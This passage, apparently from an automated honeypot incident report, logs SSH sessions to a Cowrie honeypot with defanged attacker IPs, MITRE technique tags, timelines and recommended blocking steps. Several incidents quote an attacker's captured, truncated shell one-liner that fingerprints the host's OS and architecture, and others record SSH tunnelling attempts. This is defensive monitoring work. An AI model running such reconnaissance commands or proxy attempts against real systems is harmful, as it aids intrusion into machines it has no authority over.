| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:04:31` | `cowrie.session.connect` |
| `2026-08-20 20:04:32` | `cowrie.client.version` |
| `2026-08-20 20:04:32` | `cowrie.client.kex` |
| `2026-08-20 20:04:39` | `cowrie.login.success` |
| `2026-08-20 20:04:43` | `cowrie.session.params` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:43` | `cowrie.command.success` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:43` | `cowrie.command.input` |
| `2026-08-20 20:04:45` | `cowrie.log.closed` |
| `2026-08-20 20:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e839d0610f22

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:06 |
| **Last Seen** | 2026-08-20 20:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:06:14` | `cowrie.session.connect` |
| `2026-08-20 20:06:16` | `cowrie.client.version` |
| `2026-08-20 20:06:16` | `cowrie.client.kex` |
| `2026-08-20 20:06:17` | `cowrie.login.success` |
| `2026-08-20 20:06:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:06:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:06:17` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ba4720c8879

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:06 |
| **Last Seen** | 2026-08-20 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:06:26` | `cowrie.session.connect` |
| `2026-08-20 20:06:26` | `cowrie.client.version` |
| `2026-08-20 20:06:26` | `cowrie.client.kex` |
| `2026-08-20 20:06:27` | `cowrie.login.success` |
| `2026-08-20 20:06:27` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:06:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:06:28` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c918794c046

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 20:07 |
| **Last Seen** | 2026-08-20 20:07 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:07:27` | `cowrie.session.connect` |
| `2026-08-20 20:07:29` | `cowrie.client.version` |
| `2026-08-20 20:07:29` | `cowrie.client.kex` |
| `2026-08-20 20:07:39` | `cowrie.login.success` |
| `2026-08-20 20:07:45` | `cowrie.session.params` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:45` | `cowrie.command.success` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:45` | `cowrie.command.input` |
| `2026-08-20 20:07:48` | `cowrie.log.closed` |
| `2026-08-20 20:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d77a832189d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 20:10 |
| **Last Seen** | 2026-08-20 20:10 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:10:26` | `cowrie.session.connect` |
| `2026-08-20 20:10:30` | `cowrie.client.version` |
| `2026-08-20 20:10:30` | `cowrie.client.kex` |
| `2026-08-20 20:10:41` | `cowrie.login.success` |
| `2026-08-20 20:10:49` | `cowrie.session.params` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:49` | `cowrie.command.success` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:49` | `cowrie.command.input` |
| `2026-08-20 20:10:53` | `cowrie.log.closed` |
| `2026-08-20 20:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eceb5b6494e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 20:13 |
| **Last Seen** | 2026-08-20 20:13 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:13:17` | `cowrie.session.connect` |
| `2026-08-20 20:13:22` | `cowrie.client.version` |
| `2026-08-20 20:13:22` | `cowrie.client.kex` |
| `2026-08-20 20:13:38` | `cowrie.login.success` |
| `2026-08-20 20:13:43` | `cowrie.session.params` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:43` | `cowrie.command.success` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:43` | `cowrie.command.input` |
| `2026-08-20 20:13:45` | `cowrie.log.closed` |
| `2026-08-20 20:13:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-285b46c900ce

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-20 20:14 |
| **Last Seen** | 2026-08-20 20:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:14:17` | `cowrie.session.connect` |
| `2026-08-20 20:14:18` | `cowrie.client.version` |
| `2026-08-20 20:14:18` | `cowrie.client.kex` |
| `2026-08-20 20:14:20` | `cowrie.login.success` |
| `2026-08-20 20:14:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd3018065327

| Field | Detail |
|---|---|
| **Source IP** | `116.114.94[.]242` |
| **First Seen** | 2026-08-20 20:14 |
| **Last Seen** | 2026-08-20 20:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:14:28` | `cowrie.session.connect` |
| `2026-08-20 20:14:28` | `cowrie.client.version` |
| `2026-08-20 20:14:28` | `cowrie.client.kex` |
| `2026-08-20 20:14:30` | `cowrie.login.success` |
| `2026-08-20 20:14:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.94[.]242` to AbuseIPDB if not already reported
- [ ] Block `116.114.94[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f83d3a49cbe

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 20:16 |
| **Last Seen** | 2026-08-20 20:17 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:16:33` | `cowrie.session.connect` |
| `2026-08-20 20:16:35` | `cowrie.client.version` |
| `2026-08-20 20:16:35` | `cowrie.client.kex` |
| `2026-08-20 20:16:43` | `cowrie.login.success` |
| `2026-08-20 20:16:47` | `cowrie.session.params` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:16:47` | `cowrie.command.success` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:16:47` | `cowrie.command.input` |
| `2026-08-20 20:17:03` | `cowrie.log.closed` |
| `2026-08-20 20:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c02bf945c42

| Field | Detail |
|---|---|
| **Source IP** | `223.107.72[.]234` |
| **First Seen** | 2026-08-20 20:17 |
| **Last Seen** | 2026-08-20 20:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:17:37` | `cowrie.session.connect` |
| `2026-08-20 20:17:38` | `cowrie.client.version` |
| `2026-08-20 20:17:38` | `cowrie.client.kex` |
| `2026-08-20 20:17:40` | `cowrie.login.success` |
| `2026-08-20 20:17:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.107.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `223.107.72[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb046f95965b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:17 |
| **Last Seen** | 2026-08-20 20:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:17:43` | `cowrie.session.connect` |
| `2026-08-20 20:17:43` | `cowrie.client.version` |
| `2026-08-20 20:17:43` | `cowrie.client.kex` |
| `2026-08-20 20:17:46` | `cowrie.login.success` |
| `2026-08-20 20:17:48` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:17:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:17:55` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db6507968b04

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-08-20 20:17 |
| **Last Seen** | 2026-08-20 20:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:17:46` | `cowrie.session.connect` |
| `2026-08-20 20:17:47` | `cowrie.client.version` |
| `2026-08-20 20:17:47` | `cowrie.client.kex` |
| `2026-08-20 20:17:50` | `cowrie.login.success` |
| `2026-08-20 20:17:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eabe8b3bc28

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:17 |
| **Last Seen** | 2026-08-20 20:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:17:55` | `cowrie.session.connect` |
| `2026-08-20 20:17:55` | `cowrie.client.version` |
| `2026-08-20 20:17:55` | `cowrie.client.kex` |
| `2026-08-20 20:17:57` | `cowrie.login.success` |
| `2026-08-20 20:17:59` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:17:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:17:59` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c096202812

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 20:19 |
| **Last Seen** | 2026-08-20 20:20 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:19:55` | `cowrie.session.connect` |
| `2026-08-20 20:19:57` | `cowrie.client.version` |
| `2026-08-20 20:19:57` | `cowrie.client.kex` |
| `2026-08-20 20:20:08` | `cowrie.login.success` |
| `2026-08-20 20:20:18` | `cowrie.session.params` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:18` | `cowrie.command.success` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:18` | `cowrie.command.input` |
| `2026-08-20 20:20:21` | `cowrie.log.closed` |
| `2026-08-20 20:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af83dba99f11

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-20 20:22 |
| **Last Seen** | 2026-08-20 20:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:22:47` | `cowrie.session.connect` |
| `2026-08-20 20:22:47` | `cowrie.client.version` |
| `2026-08-20 20:22:47` | `cowrie.client.kex` |
| `2026-08-20 20:22:50` | `cowrie.login.success` |
| `2026-08-20 20:22:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c62cd6d14c1

| Field | Detail |
|---|---|
| **Source IP** | `117.158.166[.]73` |
| **First Seen** | 2026-08-20 20:25 |
| **Last Seen** | 2026-08-20 20:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:25:56` | `cowrie.session.connect` |
| `2026-08-20 20:25:57` | `cowrie.client.version` |
| `2026-08-20 20:25:57` | `cowrie.client.kex` |
| `2026-08-20 20:25:59` | `cowrie.login.success` |
| `2026-08-20 20:26:00` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.166[.]73` to AbuseIPDB if not already reported
- [ ] Block `117.158.166[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9928eceb816

| Field | Detail |
|---|---|
| **Source IP** | `117.250.19[.]91` |
| **First Seen** | 2026-08-20 20:26 |
| **Last Seen** | 2026-08-20 20:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:26:06` | `cowrie.session.connect` |
| `2026-08-20 20:26:07` | `cowrie.client.version` |
| `2026-08-20 20:26:07` | `cowrie.client.kex` |
| `2026-08-20 20:26:10` | `cowrie.login.success` |
| `2026-08-20 20:26:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.19[.]91` to AbuseIPDB if not already reported
- [ ] Block `117.250.19[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac54a9ecc8c6

| Field | Detail |
|---|---|
| **Source IP** | `50.188.204[.]213` |
| **First Seen** | 2026-08-20 20:26 |
| **Last Seen** | 2026-08-20 20:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:26:11` | `cowrie.session.connect` |
| `2026-08-20 20:26:13` | `cowrie.client.version` |
| `2026-08-20 20:26:13` | `cowrie.client.kex` |
| `2026-08-20 20:26:16` | `cowrie.login.success` |
| `2026-08-20 20:26:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:26:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.188.204[.]213` to AbuseIPDB if not already reported
- [ ] Block `50.188.204[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eb5e1961083

| Field | Detail |
|---|---|
| **Source IP** | `60.249.251[.]88` |
| **First Seen** | 2026-08-20 20:26 |
| **Last Seen** | 2026-08-20 20:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:26:23` | `cowrie.session.connect` |
| `2026-08-20 20:26:24` | `cowrie.client.version` |
| `2026-08-20 20:26:24` | `cowrie.client.kex` |
| `2026-08-20 20:26:26` | `cowrie.login.success` |
